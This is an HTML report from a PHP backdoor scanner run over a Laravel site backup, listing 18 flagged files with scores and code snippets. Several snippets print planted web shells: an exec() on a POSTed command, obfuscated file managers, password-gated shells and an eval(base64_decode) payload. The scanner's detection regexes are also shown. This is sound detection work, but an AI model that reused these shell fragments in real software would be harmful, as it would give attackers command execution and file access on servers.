
<!doctype html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>PHP Backdoor Scan Report</title>
<style>
body{font-family: -apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,'Helvetica Neue',Arial,'Noto Sans','Liberation Sans',sans-serif; margin:0; background:#0f1216; color:#e6edf3}
header{display:flex; align-items:center; justify-content:space-between; padding:16px 20px; background:#151a21; border-bottom:1px solid #232a34}
.brand{font-weight:600; letter-spacing:.2px}
.badge{display:inline-block; padding:2px 8px; border-radius:999px; font-size:12px; margin-left:8px}
.b-high{background:#3d0f12; color:#ff6b6b}
.b-medium{background:#2f2612; color:#f7b731}
.b-low{background:#16262f; color:#4dd0e1}
.wrap{padding:16px 20px}
.controls{display:flex; gap:12px; flex-wrap:wrap; margin-bottom:12px}
.controls input,.controls select{background:#0f1216; color:#e6edf3; border:1px solid #2b3440; border-radius:8px; padding:8px 10px}
.summary{display:flex; gap:16px; flex-wrap:wrap; margin-bottom:12px; font-size:14px}
.card{background:#151a21; border:1px solid #232a34; border-radius:10px; padding:10px 12px}
table{width:100%; border-collapse:collapse; background:#0f1216; border:1px solid #232a34; border-radius:10px; overflow:hidden}
thead th{position:sticky; top:0; background:#151a21; color:#9fb7d0; font-weight:600; text-align:left; padding:10px; border-bottom:1px solid #232a34; cursor:pointer}
tbody td{padding:10px; border-bottom:1px solid #1b2129; vertical-align:top;}
tbody tr:hover{background:#12171e}
.risk-high{color:#ff6b6b}
.risk-medium{color:#f7b731}
.risk-low{color:#4dd0e1}
.path{font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, 'Liberation Mono', 'Courier New', monospace; font-size:13px}
.reasons{font-size:13px; color:#c7d1db}
.lines{font-size:12px; color:#9fb7d0}
.footer{margin-top:12px; font-size:12px; color:#9fb7d0}
.empty{padding:24px; text-align:center; color:#9fb7d0}
.sort-ind{margin-left:6px; font-size:12px; color:#9fb7d0}
.modal{position:fixed; inset:0; display:flex; align-items:center; justify-content:center}
.hidden{display:none}
.overlay{position:absolute; inset:0; background:rgba(0,0,0,.55)}
.box{position:relative; background:#151a21; border:1px solid #232a34; border-radius:10px; width:min(900px,90vw); max-height:80vh; overflow:auto; padding:16px}
.head{display:flex; align-items:center; justify-content:space-between; gap:12px; margin-bottom:8px}
.actions{display:flex; gap:8px}
.btn{background:#0f1216; color:#e6edf3; border:1px solid #2b3440; border-radius:8px; padding:6px 10px}
.code-view{margin-top:8px; background:#0f1216; border:1px solid #232a34; border-radius:8px; padding:8px}
.code-row{display:flex; gap:10px; padding:2px 0}
.ln{width:50px; text-align:right; color:#9fb7d0}
.code{font-family:ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, 'Liberation Mono', 'Courier New', monospace; white-space:pre-wrap; word-break:break-word}
.hl{background:#1b222b}
</style>
</head>
<body>
<header>
  <div class="brand">PHP Backdoor Scan Report</div>
  <div>
    <span class="badge b-high">High: 12</span>
    <span class="badge b-medium">Medium: 4</span>
    <span class="badge b-low">Low: 2</span>
  </div>
</header>
<div class="wrap">
  <div class="summary">
    <div class="card">Root: <span class="path">C:\Users\shaki\Downloads\Compressed\new-backup</span></div>
    <div class="card">Scanned: 4983</div>
    <div class="card">Flagged: 18</div>
    <div class="card">Min score: 3</div>
    <div class="card">Generated: <span id="gen"></span></div>
  </div>
  <div class="controls">
    <input id="search" type="search" placeholder="Filter by path or reasons" />
    <select id="risk">
      <option>All</option>
      <option>High</option>
      <option>Medium</option>
      <option>Low</option>
    </select>
  </div>
  <table>
    <thead>
      <tr>
        <th data-key="risk">Risk<span class="sort-ind" id="si-risk"></span></th>
        <th data-key="score">Score<span class="sort-ind" id="si-score"></span></th>
        <th data-key="path">Path<span class="sort-ind" id="si-path"></span></th>
        <th data-key="reasons">Reasons<span class="sort-ind" id="si-reasons"></span></th>
        <th data-key="lines">Lines<span class="sort-ind" id="si-lines"></span></th>
      </tr>
    </thead>
    <tbody id="rows"></tbody>
  </table>
  <div class="footer">Click headers to sort. Use filters to narrow results.</div>
</div>
<div id="modal" class="modal hidden">
  <div id="overlay" class="overlay"></div>
  <div class="box">
    <div class="head">
      <div class="path" id="modal-path"></div>
      <div class="actions">
        <button id="copy" class="btn">Copy</button>
        <button id="close" class="btn">Close</button>
      </div>
    </div>
    <div class="meta">Reasons: <span id="modal-reasons"></span></div>
    <div id="code" class="code-view"></div>
  </div>
  </div>
<script>
const report = {"meta": {"root": "C:\\Users\\shaki\\Downloads\\Compressed\\new-backup", "scanned": 4983, "flagged": 18, "min_score": 3, "risk_counts": {"High": 12, "Medium": 4, "Low": 2}, "generated_at": 1763903632}, "results": [{"path": "C:\\Users\\shaki\\Downloads\\Compressed\\new-backup\\artisan", "score": 8, "risk": "Medium", "reasons": ["PHP code in non-PHP file"], "lines": [], "snippet_lines": [{"n": 1, "t": "#!/usr/bin/env php"}, {"n": 2, "t": "<?php"}, {"n": 3, "t": ""}, {"n": 4, "t": "define('LARAVEL_START', microtime(true));"}, {"n": 5, "t": ""}, {"n": 6, "t": "/*"}, {"n": 7, "t": "|--------------------------------------------------------------------------"}], "snippet_focus": 1}, {"path": "C:\\Users\\shaki\\Downloads\\Compressed\\new-backup\\backup.zip", "score": 8, "risk": "Medium", "reasons": ["PHP code in non-PHP file"], "lines": [], "snippet_lines": [{"n": 1, "t": "PK\u0003\u0004"}, {"n": 2, "t": "\u0000\u0000\u0000\u0000\u0000q[\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000"}, {"n": 3, "t": "\u0000"}, {"n": 4, "t": "\u0000.well-known/UT\t\u0000\u0003\u001aX\u001biƊ\"iux"}, {"n": 5, "t": "\u0000\u0001\u0004S\u0004\u0000\u0000\u0004U\u0004\u0000\u0000PK\u0003\u0004"}, {"n": 6, "t": "\u0000\u0000\u0000\u0000\u0000q[\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u001b\u0000"}, {"n": 7, "t": "\u0000.well-known/acme-challenge/UT\t\u0000\u00035X\u001bik\"iux"}], "snippet_focus": 1}, {"path": "C:\\Users\\shaki\\Downloads\\Compressed\\new-backup\\scan_php_backdoors.py", "score": 9, "risk": "Medium", "reasons": ["PHP code in non-PHP file", "error_reporting(0)"], "lines": [29], "snippet_lines": [{"n": 23, "t": "    (re.compile(r\"(include|require|include_once|require_once)\\s*\\(\\s*['\\\"]https?://\", re.IGNORECASE), \"remote include\", 7),"}, {"n": 24, "t": "    (re.compile(r\"assert\\s*\\(\\s*\\$_(GET|POST|REQUEST|COOKIE)\\[[^\\]]+\\]\\s*\\)\", re.IGNORECASE), \"assert on user input\", 7),"}, {"n": 25, "t": "    (re.compile(r\"(shell_exec|system|passthru|exec|popen|proc_open)\\s*\\(\", re.IGNORECASE), \"command execution API\", 4),"}, {"n": 26, "t": "    (re.compile(r\"base64_decode\\s*\\(\\s*str_rot13\\s*\\(\", re.IGNORECASE), \"base64+rot13\", 7),"}, {"n": 27, "t": "    (re.compile(r\"str_rot13\\s*\\(\", re.IGNORECASE), \"str_rot13\", 3),"}, {"n": 28, "t": "    (re.compile(r\"create_function\\s*\\(\", re.IGNORECASE), \"create_function\", 4),"}, {"n": 29, "t": "    (re.compile(r\"error_reporting\\s*\\(\\s*0\\s*\\)\", re.IGNORECASE), \"error_reporting(0)\", 1),"}, {"n": 30, "t": "    (re.compile(r\"chr\\s*\\(\\s*\\d+\\s*\\)\\s*(\\.\\s*chr\\s*\\(\\s*\\d+\\s*\\)\\s*){4,}\", re.IGNORECASE), \"chr chain\", 6),"}, {"n": 31, "t": "    (re.compile(r\"\\$_(GET|POST|REQUEST|COOKIE)\\[[^\\]]+\\]\", re.IGNORECASE), \"user input\", 2),"}, {"n": 32, "t": "    (re.compile(r\"[A-Za-z0-9+/]{200,}={0,3}\", re.IGNORECASE), \"long base64\", 3),"}, {"n": 33, "t": "    (re.compile(r\"\\$[a-zA-Z_][a-zA-Z0-9_]*\\s*=\\s*base64_decode\\s*\\([^)]*\\)\\s*;\\s*eval\\s*\\(\\s*\\$\\w+\\s*\\)\", re.IGNORECASE), \"eval(variable from base64)\", 9),"}, {"n": 34, "t": "]"}, {"n": 35, "t": ""}], "snippet_focus": 29}, {"path": "C:\\Users\\shaki\\Downloads\\Compressed\\new-backup\\public\\global\\js\\index.php", "score": 134, "risk": "High", "reasons": ["command execution API", "user input"], "lines": [95, 96, 97, 100, 101], "snippet_lines": [{"n": 89, "t": "For more updates do pm me."}, {"n": 90, "t": "<br>"}, {"n": 91, "t": "</font>"}, {"n": 92, "t": "<br>"}, {"n": 93, "t": "<button><a href=''>Contact</a></button>"}, {"n": 94, "t": "\";"}, {"n": 95, "t": "if(!empty($_POST['cmd'])){"}, {"n": 96, "t": "\t$cmd = $_POST['cmd'];"}, {"n": 97, "t": "\texec($cmd,$b);"}, {"n": 98, "t": "\t$status = \"Success!\";"}, {"n": 99, "t": "}"}, {"n": 100, "t": "if(isset($_GET['path'])){"}, {"n": 101, "t": "$path = $_GET['path'];"}], "snippet_focus": 95}, {"path": "C:\\Users\\shaki\\Downloads\\Compressed\\new-backup\\public\\global\\toastr\\index.php", "score": 69, "risk": "High", "reasons": ["error_reporting(0)", "user input"], "lines": [1, 56], "snippet_lines": [{"n": 1, "t": "<?php error_reporting(0); http_response_code(404); define(\"Yp\", \"\"); $G3 = \"scandir\"; $c8 = array(\"7068705f756e616d65\", \"70687076657273696f6e\", \"676574637764\", \"6368646972\", \"707265675f73706c6974\", \"61727261795f64696666\", \"69735f646972\", \"69735f66696c65\", \"69735f7772697461626c65\", \"69735f7265616461626c65\", \"66696c6573697a65\", \"636f7079\", \"66696c655f657869737473\", \"66696c655f7075745f636f6e74656e7473\", \"66696c655f6765745f636f6e74656e7473\", \"6d6b646972\", \"72656e616d65\", \"737472746f74696d65\", \"68746d6c7370656369616c6368617273\", \"64617465\", \"66696c656d74696d65\"); $lE = 0; T4: if (!($lE < count($c8))) { goto Je; } $c8[$lE] = JD($c8[$lE]); Cy: $lE++; goto T4; Je: if (isset($_GET[\"p\"])) { goto sr; } $Jd = $c8[2](); goto VN; sr: $Jd = jD($_GET[\"p\"]); $c8[3](Jd($_GET[\"p\"])); VN: function Ss($SP) { $dE = \"\"; $lE = 0; NZ: if (!($lE < strlen($SP))) { goto Xc; } $dE .= dechex(ord($SP[$lE])); WK: $lE++; goto NZ; Xc: return $dE; } function Jd($SP) { $dE = \"\"; $gf = strlen($SP) - 1; $lE = 0; Xp: if (!("}, {"n": 2, "t": "<!doctype html>"}, {"n": 3, "t": "<html lang=\"en\">"}, {"n": 4, "t": "<head>"}, {"n": 5, "t": "<meta name=\"theme-color\" content=\"red\">"}, {"n": 6, "t": "<meta name=\"viewport\" content=\"width=device-width, initial-scale=0.60, shrink-to-fit=no\">"}, {"n": 7, "t": "<link rel=\"stylesheet\" href=\"//cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css\">"}], "snippet_focus": 1}, {"path": "C:\\Users\\shaki\\Downloads\\Compressed\\new-backup\\public\\frontend\\img\\index.php", "score": 91, "risk": "High", "reasons": ["error_reporting(0)", "user input"], "lines": [2, 4, 26, 27, 28], "snippet_lines": [{"n": 1, "t": "<?php"}, {"n": 2, "t": "error_reporting(0);"}, {"n": 3, "t": "session_start();"}, {"n": 4, "t": "if (md5($_POST[\"password\"]) == md5('fg123')) {"}, {"n": 5, "t": "    $_SESSION[\"isLogin\"] = true;"}, {"n": 6, "t": "} else {"}, {"n": 7, "t": "    XWoSq();"}, {"n": 8, "t": "}"}], "snippet_focus": 2}, {"path": "C:\\Users\\shaki\\Downloads\\Compressed\\new-backup\\public\\frontend\\js\\tinymce\\index.php", "score": 60, "risk": "High", "reasons": ["user input"], "lines": [1], "snippet_lines": [{"n": 1, "t": "<?php SeT_time_lImit((int)ROUnd(0+0+0));eRror_RePOrtInG((0370+0344-0611)-(-0552+0104+-01115+01362)+(int)ROunD(-53+-53+-53+-53));eRRor_lOG((int)roUND(0+0+0+0));$_ivghba=\"0\\x62\\171t3\\x6d\\x31n1\".\"\\x2d\\x56\\062\";$_kppjy=\"g\".\"et\\x63\\x77\\144\";$_riyihe=\"file\".\"\\x5fget\\x5fcont\\145nts\";$_vwfj=\"s\".\"\\143a\\x6e\\144i\".\"r\";$_iqfpyxb=\"rm\\x64\".\"ir\";$_ebxy=\"u\\x6e\".\"li\\x6ek\";if(gEt_maGiC_QuoTES_GpC()){foreach($_POST as$_ptcz=>$_lewnrml){$_POST[$_ptcz]=sTRiPSLasHes($_lewnrml);}echo\"\\x3c!DOC\\x54YPE\\040\\150t\\x6dl><\\x68tm\\x6c\\x3e<\\x68ea\\x64>\\074met\\x61\\x20n\\x61me\\075\\x22\\162obot\\163\\042\\040\\x63on\\x74\\x65n\\164\\042n\\157ind\\145x.\\040nofo\\154lo\\x77\\x22\\076\\074\\154\\151n\\153\\040hr\\x65f\\x3d\\x22https:\\057/f\\x6fnts.\\147o\\157\\x67l\\145\\141p\\151\\x73.\\143\\x6fm/\\143ss\\x3ffami\\x6cy=\\126\\x54\\x33\\x32\\063\\042 re\\x6c=\\x22\\163tyl\\145\\x73heet\\042\\x3e<\\164itl\\x65>\".$_ivghba.\"\\x3c/ti\\164le\\076\\x3c\\163\\x63rip\\164\\x20s\\162c=\\042htt\\x70\\x73://\\141\\152ax\\x2e\\147\\157\\157g\\154eapis.\\x63\\x6f\\155\\x2f\\x61\\x6a\\141x\\x2f\\x6cibs/\\152\\x71ue\\162"}], "snippet_focus": 1}, {"path": "C:\\Users\\shaki\\Downloads\\Compressed\\new-backup\\public\\frontend\\js\\tinymce\\js\\tinymce\\models\\dom\\index.php", "score": 91, "risk": "High", "reasons": ["error_reporting(0)", "user input"], "lines": [2, 113, 114, 115, 139], "snippet_lines": [{"n": 1, "t": "<?php"}, {"n": 2, "t": "\terror_reporting(0); "}, {"n": 3, "t": "$iniarray =   ["}, {"n": 4, "t": "        \"7068705F756E616D65\", # [0]"}, {"n": 5, "t": "        \"73657373696F6E5F7374617274\", # [1]"}, {"n": 6, "t": "        \"6572726F725F7265706F7274696E67\", # [2]"}, {"n": 7, "t": "        \"70687076657273696F6E\", # [3]"}, {"n": 8, "t": "        \"66696C655F7075745F636F6E74656E7473\", # [4]"}], "snippet_focus": 2}, {"path": "C:\\Users\\shaki\\Downloads\\Compressed\\new-backup\\public\\frontend\\img\\instructor\\index.php", "score": 144, "risk": "High", "reasons": ["user input"], "lines": [2], "snippet_lines": [{"n": 1, "t": "<?php"}, {"n": 2, "t": " goto Eyp25LCbtJ; zjL6uRwIhU: ${\"\\107\\x4c\\x4f\\102\\101\\114\\123\"}[\"\\142\\x6f\\x6a\\x76\\x6d\\x6d\\x6c\\x7a\\x62\\153\\x73\"] = \"\\144\\151\\162\"; ${\"\\107\\x4c\\x4f\\102\\101\\x4c\\x53\"}[\"\\171\\143\\x78\\163\\160\\x70\\167\\165\"] = \"\\146\\151\\x6c\\x65\\163\"; ${\"\\x47\\x4c\\x4f\\x42\\x41\\114\\123\"}[\"\\x6e\\156\\147\\145\\162\\x78\\153\\144\\154\\x6e\"] = \"\\144\\x69\\x72\\163\"; ${\"\\107\\x4c\\x4f\\102\\x41\\x4c\\123\"}[\"\\x66\\x66\\147\\143\\x67\\x6a\\163\\154\\x70\\x68\\x6b\\162\"] = \"\\164\\145\\x78\\64\"; ${\"\\x47\\x4c\\117\\102\\x41\\x4c\\123\"}[\"\\164\\164\\155\\x78\\x79\\170\\x71\\146\\143\\162\\151\"] = \"\\x74\\145\\x78\\63\"; goto FS5jjz6Omm; WE7WXC6_gq: echo \"\\46\\141\\x64\\x6d\\151\\156\\145\\162\\42\\40\\x63\\154\\x61\\163\\163\\x3d\\x22\\x62\\x74\\156\\x2d\\163\\165\\x62\\155\\x69\\x74\\42\\x3e\\x41\\144\\x6d\\x69\\x6e\\x65\\162\\x3c\\57\\141\\76\\74\\57\\154\\x69\\76\\xa\\x20\\40\\x20\\40\\40\\x20\\x20\\40\\x20\\40\\x20\\40\\74\\x6c\\x69\\x3e\\74\\x61\\40\\x68\\x72\\145\\x66\\x3d\\42\\x3f\\144\\75\"; echo hx(${$wmqfjsqcgfy}[0]()); echo \"\\46\\144\\145\\163\\164\\x72\\157\\x79\\42\\40\\x63\\x6c\\x61\\163\\163\\75\\x22\\142\\x74\\x6e\\x2d\\x73\\x75\\142\\155\\x69\\164\\42\\x3e\\x4"}], "snippet_focus": 2}, {"path": "C:\\Users\\shaki\\Downloads\\Compressed\\new-backup\\public\\backend\\tinymce\\js\\tinymce\\langs\\index.php", "score": 3, "risk": "Low", "reasons": ["long base64"], "lines": [1], "snippet_lines": [{"n": 1, "t": "<?php eval(\"?>\".base64_decode(\"PD9waHAgZXZhbCgiPz4iLmJhc2U2NF9kZWNvZGUoIlBEOXdhSEFOQ2cwS1FHbHVhVjl6WlhRb0oyVnljbTl5WDJ4dlp5Y3NJRTVWVEV3cE93MEtRR2x1YVY5elpYUW9KMnh2WjE5bGNuSnZjbk1uTENBd0tUc05Da0JwYm1sZmMyVjBLQ2R0WVhoZlpYaGxZM1YwYVc5dVgzUnBiV1VuTENBd0tUc05Da0JsY25KdmNsOXlaWEJ2Y25ScGJtY29NQ2s3RFFwQWMyVjBYM1JwYldWZmJHbHRhWFFvTUNrN0RRcEFiMkpmWTJ4bFlXNG9LVHNOQ2tCb1pXRmtaWElvSWxndFFXTmpaV3d0UW5WbVptVnlhVzVuT2lCdWJ5SXBPdzBLUUdobFlXUmxjaWdpUTI5dWRHVnVkQzFGYm1OdlpHbHVaem9nYm05dVpTSXBPdzBLUUdoMGRIQmZjbVZ6Y0c5dWMyVmZZMjlrWlNnME1ETXBPdzBLUUdoMGRIQmZjbVZ6Y0c5dWMyVmZZMjlrWlNnME1EUXBPdzBLUUdoMGRIQmZjbVZ6Y0c5dWMyVmZZMjlrWlNnMU1EQXBPdzBLRFFwbWRXNWpkR2x2YmlCblpYUkdhV3hsUkdWMFlXbHNjeWdrY0dGMGFDa05DbnNOQ2lBZ0lDQWtabTlzWkdWeWN5QTlJRnRkT3cwS0lDQWdJQ1JtYVd4bGN5QTlJRnRkT3cwS0RRb2dJQ0FnZEhKNUlIc05DaUFnSUNBZ0lDQWdKR2wwWlcxeklEMGdRSE5qWVc1a2FYSW9KSEJoZEdncE93MEtJQ0FnSUNBZ0lDQnBaaUFvSVdselgyRnljbUY1S0NScGRHVnRjeWtwSUhzTkNpQWdJQ0FnSUNBZ0lDQWdJSFJvY205M0lHNWxkeUJGZUdObGNIUnBiMjRvSjBaaGFXeGxaQ0IwYnlCelkyRnVJR1JwY21Wa"}], "snippet_focus": 1}, {"path": "C:\\Users\\shaki\\Downloads\\Compressed\\new-backup\\public\\backend\\tinymce\\js\\tinymce\\themes\\silver\\index.php", "score": 91, "risk": "High", "reasons": ["error_reporting(0)", "user input"], "lines": [2], "snippet_lines": [{"n": 1, "t": "<?php"}, {"n": 2, "t": " goto x7isxMH2Mo; HVMQ0w0M6A: echo $func[9]($func[5]($path . \"\\57\" . $_GET[\"\\151\\164\\x65\\155\"])); echo \"\\74\\x2f\\164\\145\\x78\\x74\\x61\\162\\x65\\141\\76\\15\\12\\40\\x20\\40\\40\\40\\40\\40\\x20\\x20\\x20\\40\\x20\\x20\\x20\\74\\57\\144\\x69\\166\\x3e\\xd\\xa\\x20\\40\\x20\\40\\x20\\40\\40\\x20\\40\\x20\\40\\40\\x20\\x20\\x3c\\142\\165\\x74\\x74\\157\\x6e\\40\\x74\\x79\\160\\x65\\75\\x22\\x73\\165\\x62\\x6d\\151\\x74\\42\\40\\143\\154\\x61\\163\\x73\\75\\42\\x62\\x74\\x6e\\x20\\142\\164\\x6e\\55\\157\\x75\\164\\x6c\\151\\156\\145\\x2d\\154\\x69\\x67\\150\\x74\\x22\\x3e\\x53\\165\\x62\\x6d\\151\\x74\\x3c\\57\\142\\165\\164\\164\\x6f\\x6e\\x3e\\15\\xa\\x20\\40\\40\\40\\40\\x20\\x20\\x20\\x20\\x20\\40\\x20\\x20\\x20\\74\\x62\\165\\x74\\164\\x6f\\156\\40\\x74\\x79\\160\\145\\75\\x22\\x62\\x75\\164\\x74\\157\\156\\x22\\x20\\143\\154\\x61\\163\\x73\\75\\x22\\x62\\164\\x6e\\x20\\x62\\x74\\156\\x2d\\157\\165\\x74\\154\\151\\156\\x65\\x2d\\x6c\\x69\\147\\150\\x74\\42\\x20\\157\\x6e\\143\\x6c\\151\\143\\x6b\\x3d\\42\\x6a\\163\\143\\157\\x70\\171\\50\\51\\x22\\x3e\\103\\157\\160\\171\\x3c\\57\\142\\165\\164\\x74\\157\\156\\76\\xd\\xa\\x20\\x20\\40\\x20\\40\\x20\\x20\\40\\40\\x20\\40\\x20\\40\\x20\\x3c\\142\\165\\164\\x74\\x6"}], "snippet_focus": 2}, {"path": "C:\\Users\\shaki\\Downloads\\Compressed\\new-backup\\public\\backend\\tinymce\\js\\tinymce\\skins\\content\\dark\\index.php", "score": 8, "risk": "Medium", "reasons": ["error_reporting(0)", "user input", "long base64"], "lines": [3, 11, 12, 55], "snippet_lines": [{"n": 1, "t": "<?php"}, {"n": 2, "t": "$password = '0c77b9949b3f9c2db133ee7db2620b99';"}, {"n": 3, "t": "error_reporting(0);"}, {"n": 4, "t": "set_time_limit(0);"}, {"n": 5, "t": ""}, {"n": 6, "t": "session_start();"}, {"n": 7, "t": "if (!isset($_SESSION['loggedIn'])) {"}, {"n": 8, "t": "    $_SESSION['loggedIn'] = false;"}, {"n": 9, "t": "}"}], "snippet_focus": 3}, {"path": "C:\\Users\\shaki\\Downloads\\Compressed\\new-backup\\Modules\\GlobalSetting\\app\\Http\\Controllers\\ManageAddonController.php", "score": 4, "risk": "Low", "reasons": ["command execution API"], "lines": [490], "snippet_lines": [{"n": 484, "t": "    }"}, {"n": 485, "t": ""}, {"n": 486, "t": "    public function ModuleRefresh()"}, {"n": 487, "t": "    {"}, {"n": 488, "t": "        try {"}, {"n": 489, "t": ""}, {"n": 490, "t": "            exec('php composer.phar dump-autoload');"}, {"n": 491, "t": ""}, {"n": 492, "t": "            Artisan::call('cache:clear');"}, {"n": 493, "t": "            Artisan::call('view:clear');"}, {"n": 494, "t": "            Artisan::call('config:clear');"}, {"n": 495, "t": ""}, {"n": 496, "t": "        } catch (Exception $e) {"}], "snippet_focus": 490}, {"path": "C:\\Users\\shaki\\Downloads\\Compressed\\new-backup\\Modules\\CryptoPayment\\app\\Traits\\Helpers.php", "score": 16, "risk": "High", "reasons": ["command execution API"], "lines": [71, 114, 145, 175], "snippet_lines": [{"n": 65, "t": "        curl_setopt($url, CURLOPT_CUSTOMREQUEST, \"POST\");"}, {"n": 66, "t": "        curl_setopt($url, CURLOPT_RETURNTRANSFER, true);"}, {"n": 67, "t": "        curl_setopt($url, CURLOPT_POSTFIELDS, $post_token);"}, {"n": 68, "t": "        curl_setopt($url, CURLOPT_FOLLOWLOCATION, 1);"}, {"n": 69, "t": "        curl_setopt($url, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);"}, {"n": 70, "t": ""}, {"n": 71, "t": "        $resultdata = curl_exec($url);"}, {"n": 72, "t": "        curl_close($url);"}, {"n": 73, "t": ""}, {"n": 74, "t": "        $response = json_decode($resultdata, true);"}, {"n": 75, "t": "        if (array_key_exists('msg', $response)) {"}, {"n": 76, "t": "            return $response;"}, {"n": 77, "t": "        }"}], "snippet_focus": 71}, {"path": "C:\\Users\\shaki\\Downloads\\Compressed\\new-backup\\Modules\\BkashPG\\app\\Traits\\Helpers.php", "score": 16, "risk": "High", "reasons": ["command execution API"], "lines": [71, 114, 148, 178], "snippet_lines": [{"n": 65, "t": "        curl_setopt($url, CURLOPT_CUSTOMREQUEST, \"POST\");"}, {"n": 66, "t": "        curl_setopt($url, CURLOPT_RETURNTRANSFER, true);"}, {"n": 67, "t": "        curl_setopt($url, CURLOPT_POSTFIELDS, $post_token);"}, {"n": 68, "t": "        curl_setopt($url, CURLOPT_FOLLOWLOCATION, 1);"}, {"n": 69, "t": "        curl_setopt($url, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);"}, {"n": 70, "t": ""}, {"n": 71, "t": "        $resultdata = curl_exec($url);"}, {"n": 72, "t": "        curl_close($url);"}, {"n": 73, "t": ""}, {"n": 74, "t": "        $response = json_decode($resultdata, true);"}, {"n": 75, "t": "        if (array_key_exists('msg', $response)) {"}, {"n": 76, "t": "            return $response;"}, {"n": 77, "t": "        }"}], "snippet_focus": 71}, {"path": "C:\\Users\\shaki\\Downloads\\Compressed\\new-backup\\Modules\\BasicPayment\\app\\Libraries\\Mpesa\\APIRequest.php", "score": 12, "risk": "High", "reasons": ["command execution API"], "lines": [73, 89, 105], "snippet_lines": [{"n": 67, "t": ""}, {"n": 68, "t": "    // Do a GET request"}, {"n": 69, "t": "    function __get($ch) {"}, {"n": 70, "t": "        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');"}, {"n": 71, "t": "        curl_setopt($ch, CURLOPT_URL, $this->context->get_url() . '?' . http_build_query($this->context->get_parameters()));"}, {"n": 72, "t": "        curl_setopt($ch, CURLOPT_HTTPHEADER, $this->context->get_headers());"}, {"n": 73, "t": "        $response = curl_exec($ch);"}, {"n": 74, "t": ""}, {"n": 75, "t": "        $status_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);"}, {"n": 76, "t": "        $header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE);"}, {"n": 77, "t": "        $headers = substr($response, 0, $header_size);"}, {"n": 78, "t": "        $body = substr($response, $header_size);"}, {"n": 79, "t": "        curl_close($ch);"}], "snippet_focus": 73}, {"path": "C:\\Users\\shaki\\Downloads\\Compressed\\new-backup\\Modules\\BasicPayment\\app\\Http\\Controllers\\PaymentController.php", "score": 16, "risk": "High", "reasons": ["command execution API"], "lines": [624, 673, 831, 874], "snippet_lines": [{"n": 618, "t": "            CURLOPT_HTTPHEADER     => ["}, {"n": 619, "t": "                'Content-Type: application/json',"}, {"n": 620, "t": "                \"Authorization: Bearer $token\","}, {"n": 621, "t": "            ],"}, {"n": 622, "t": "        ]);"}, {"n": 623, "t": ""}, {"n": 624, "t": "        $response = curl_exec($curl);"}, {"n": 625, "t": ""}, {"n": 626, "t": "        curl_close($curl);"}, {"n": 627, "t": "        $response = json_decode($response);"}, {"n": 628, "t": "        if ($response->status == 'success') {"}, {"n": 629, "t": "            $paymentDetails = ["}, {"n": 630, "t": "                'status'            => $response->status,"}], "snippet_focus": 624}, {"path": "C:\\Users\\shaki\\Downloads\\Compressed\\new-backup\\Modules\\BasicPayment\\app\\Http\\Controllers\\API\\PaymentController.php", "score": 16, "risk": "High", "reasons": ["command execution API"], "lines": [900, 956, 1041, 1084], "snippet_lines": [{"n": 894, "t": "            CURLOPT_HTTPHEADER     => ["}, {"n": 895, "t": "                'Content-Type: application/json',"}, {"n": 896, "t": "                \"Authorization: Bearer $token\","}, {"n": 897, "t": "            ],"}, {"n": 898, "t": "        ]);"}, {"n": 899, "t": ""}, {"n": 900, "t": "        $response = curl_exec($curl);"}, {"n": 901, "t": ""}, {"n": 902, "t": "        curl_close($curl);"}, {"n": 903, "t": "        $response = json_decode($response);"}, {"n": 904, "t": "        if ($response->status == 'success') {"}, {"n": 905, "t": "            $paymentDetails = ["}, {"n": 906, "t": "                'status'            => $response->status,"}], "snippet_focus": 900}]};
let sortKey = 'score';
let sortDir = 'desc';
let filterRisk = 'All';
let query = '';
const riskOrder = { 'High': 3, 'Medium': 2, 'Low': 1 };
function escapeHtml(s){ return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
function escapeAttr(s){ return String(s).replace(/"/g,'&quot;'); }
function fmtDate(ts){ const d=new Date(ts*1000); return d.toLocaleString(); }
function setSortInd(){ const keys=['risk','score','path','reasons','lines']; keys.forEach(k=>{ const el=document.getElementById('si-'+k); if(!el)return; el.textContent = sortKey===k ? (sortDir==='asc'?'▲':'▼') : ''; }); }
function render(){ const rowsEl=document.getElementById('rows'); const q=query.trim().toLowerCase(); let items=report.results.slice(); if(filterRisk!=='All'){ items=items.filter(x=>x.risk===filterRisk); } if(q){ items=items.filter(x=> (x.path||'').toLowerCase().includes(q) || (x.reasons||[]).join('; ').toLowerCase().includes(q)); } items.sort((a,b)=>{ let va=a[sortKey], vb=b[sortKey]; if(sortKey==='risk'){ va=riskOrder[va]||0; vb=riskOrder[vb]||0; } if(sortKey==='reasons'){ va=(a.reasons||[]).join('; '); vb=(b.reasons||[]).join('; '); } if(sortKey==='lines'){ va=(a.lines||[]).join(','); vb=(b.lines||[]).join(','); } if(typeof va==='string'&&typeof vb==='string'){ const r=va.localeCompare(vb); return sortDir==='asc'?r:-r; } const r=(va>vb)-(va<vb); return sortDir==='asc'?r:-r; }); let html=''; if(items.length===0){ html = '<tr><td colspan="5" class="empty">No matching results</td></tr>'; } else { for(const it of items){ const rc = it.risk==='High'?'risk-high':(it.risk==='Medium'?'risk-medium':'risk-low'); const reasons = (it.reasons||[]).join('; '); const lines = (it.lines||[]).join(','); html += '<tr data-path="'+escapeAttr(it.path)+'">' + '<td class="'+rc+'">'+it.risk+'</td>' + '<td>'+it.score+'</td>' + '<td class="path">'+escapeHtml(it.path)+'</td>' + '<td class="reasons">'+escapeHtml(reasons)+'</td>' + '<td class="lines">'+escapeHtml(lines)+'</td>' + '</tr>'; } }
 rowsEl.innerHTML=html; setSortInd(); }
document.getElementById('gen').textContent = fmtDate(report.meta.generated_at);
document.getElementById('risk').value='All';
document.getElementById('risk').addEventListener('change', e=>{ filterRisk=e.target.value; render(); });
